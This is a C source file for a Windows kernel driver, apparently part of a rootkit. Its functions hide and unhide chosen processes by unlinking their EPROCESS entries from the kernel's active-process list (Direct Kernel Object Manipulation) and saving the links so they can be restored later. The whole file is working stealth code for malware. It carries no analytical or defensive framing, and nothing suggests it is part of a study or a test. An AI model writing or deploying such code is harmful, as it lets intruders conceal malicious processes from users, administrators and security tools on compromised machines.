/* безликий */
#include "dkom.h"
#include "globals.h"
#include "sysinfo.h"

#define MAX_HIDDEN 16

static struct
{
    HANDLE pid;
    PEPROCESS proc;
    LIST_ENTRY saved_links;
} g_HiddenProcesses[MAX_HIDDEN];

static ULONG g_HiddenCount = 0;
static KSPIN_LOCK g_DkomLock;

void Ox_Init(void)
{
    KeInitializeSpinLock(&g_DkomLock);
}

NTSTATUS Ox_HideProcess(HANDLE pid)
{
    PEPROCESS proc = Sx_FindProcess(pid);
    if (!proc) return STATUS_NOT_FOUND;

    KIRQL irql;
    KeAcquireSpinLock(&g_DkomLock, &irql);

    if (g_HiddenCount >= MAX_HIDDEN) {
        KeReleaseSpinLock(&g_DkomLock, irql);
        ObDereferenceObject(proc);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    PLIST_ENTRY links = (PLIST_ENTRY)((UCHAR *)proc + g_Offsets.eprocess_active_links);

    g_HiddenProcesses[g_HiddenCount].pid              = pid;
    g_HiddenProcesses[g_HiddenCount].proc              = proc;
    g_HiddenProcesses[g_HiddenCount].saved_links.Flink = links->Flink;
    g_HiddenProcesses[g_HiddenCount].saved_links.Blink = links->Blink;
    g_HiddenCount++;

    links->Blink->Flink = links->Flink;
    links->Flink->Blink = links->Blink;
    links->Flink        = links;
    links->Blink        = links;

    KeReleaseSpinLock(&g_DkomLock, irql);
    return STATUS_SUCCESS;
}

NTSTATUS Ox_UnhideProcess(HANDLE pid)
{
    KIRQL irql;
    KeAcquireSpinLock(&g_DkomLock, &irql);

    BOOLEAN found    = FALSE;
    PEPROCESS proc   = NULL;

    for (ULONG i = 0; i < g_HiddenCount; i++) {
        if (g_HiddenProcesses[i].pid == pid) {
            proc = g_HiddenProcesses[i].proc;
            PLIST_ENTRY links =
                (PLIST_ENTRY)((UCHAR *)proc + g_Offsets.eprocess_active_links);
            links->Flink        = g_HiddenProcesses[i].saved_links.Flink;
            links->Blink        = g_HiddenProcesses[i].saved_links.Blink;
            links->Flink->Blink = links;
            links->Blink->Flink = links;

            g_HiddenProcesses[i] = g_HiddenProcesses[g_HiddenCount - 1];
            g_HiddenCount--;
            found = TRUE;
            break;
        }
    }

    KeReleaseSpinLock(&g_DkomLock, irql);

    if (proc) ObDereferenceObject(proc);

    return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}
